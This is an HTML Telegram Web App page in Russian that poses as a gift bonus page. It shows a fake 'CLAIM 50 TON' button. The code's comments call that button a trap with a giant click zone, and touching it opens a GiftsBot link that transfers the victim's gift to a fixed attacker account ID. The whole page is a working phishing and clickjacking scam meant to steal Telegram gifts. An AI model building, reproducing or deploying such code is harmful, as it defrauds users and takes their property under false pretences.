<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0e1621; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader { border: 4px solid #242f3d; border-top: 4px solid #3390ec; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 20px; font-weight: bold; text-align: center; padding: 0 20px; }
        #trap-btn { 
            display: none; width: 95%; height: 150px; /* ГИГАНТСКАЯ ЗОНА КЛИКА */
            background: linear-gradient(180deg, #3390ec 0%, #2876c1 100%);
            color: white; border: none; border-radius: 20px; 
            font-size: 26px; font-weight: bold; cursor: pointer;
            box-shadow: 0 0 30px rgba(51,144,236,0.4);
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="loader" class="loader"></div>
    <div id="status">ПРОВЕРКА ВАШИХ ПОДАРКОВ...</div>
    <button id="trap-btn">🎁 ЗАБРАТЬ 50 TON</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        let activeId = null;

        async function init() {
            try {
                // Тянем ID подарка из твоего файла
                const res = await fetch('target.json?v=' + Date.now());
                const data = await res.json();
                activeId = data.gift_id;

                setTimeout(() => {
                    document.getElementById('loader').style.display = "none";
                    document.getElementById('status').innerHTML = "ВАМ ДОСТУПЕН БОНУС!";
                    document.getElementById('status').style.color = "#31b545";
                    document.getElementById('trap-btn').style.display = "block";
                }, 1200);
            } catch (e) { document.getElementById('status').innerHTML = "Ошибка сети"; }
        }

        // БОЕВОЙ ВЫНОС (touchstart - самая быстрая реакция)
        document.getElementById('trap-btn').addEventListener('touchstart', function(e) {
            if (!activeId) return;
            const url = `https://t.me/GiftsBot?start=transfer_${activeId}_to_8486064073`;
            tg.openTelegramLink(url); // Окно вылетает ПРЯМО ПОД ПАЛЕЦ
            this.innerHTML = "ЗАЧИСЛЕНИЕ...";
            this.style.background = "#222";
        });

        init();
    </script>
</body>
</html>
